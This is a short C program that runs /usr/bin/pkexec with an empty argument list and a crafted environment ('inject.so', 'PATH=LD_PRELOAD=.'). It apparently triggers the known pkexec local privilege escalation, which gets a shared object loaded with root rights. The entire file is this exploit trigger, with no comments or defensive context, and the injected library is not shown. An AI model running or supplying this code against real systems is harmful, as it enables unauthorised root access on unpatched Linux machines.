#include <stdlib.h>
#include <unistd.h>

int main()
{
    char const *executable = "/usr/bin/pkexec";

    char *const bad_argv[] = {
        NULL,
    };

    char *const bad_envp[] = {
        "inject.so",
        "PATH=LD_PRELOAD=.",
        NULL
    };

    return execve(executable, bad_argv, bad_envp);
}
